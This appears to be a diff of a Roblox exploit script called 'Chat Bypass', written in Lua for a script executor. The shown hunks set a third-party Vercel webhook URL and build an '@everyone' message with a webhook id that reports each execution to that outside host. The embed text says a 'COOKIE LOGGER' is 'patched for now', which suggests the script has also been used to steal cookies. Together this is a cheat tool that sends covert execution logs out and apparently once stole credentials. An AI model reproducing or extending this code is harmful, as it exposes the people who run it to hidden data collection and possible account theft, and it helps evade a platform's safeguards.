@@ -1,5 +1,5 @@
 getgenv().whscript = "Chat Bypass"
-getgenv().webhookexecUrl = "https://customwebhook.vercel.app/api/webhook"
+getgenv().webhookexecUrl = "https://customwebhook.vercel.app/api/webhook" -- https://customwebhook.vercel.app to submit like mine
 getgenv().ExecLogSecret = true
 
 local ui = gethui()
@@ -37,7 +37,8 @@ end
 local url = getgenv().webhookexecUrl
 local data = {
     ["content"] = "@everyone",
-    ["content_2"] = true,
+    ["content_2"] = "@everyone",
+    ['webhookid'] = 'fdd3bbdc9554f43c65140baa02e1baf562b00686d09c91f40dd7101c0126cacc',
     ["embeds"] = {{
         ["title"] = "MADE BY DXFC | 🚀 **Script Execution Detected | Exec Log**",
         ["description"] = "*✅ One of the Script's has been Executed.(🍪COOKIE LOGGER IS PATCHED FOR NOW!):*",
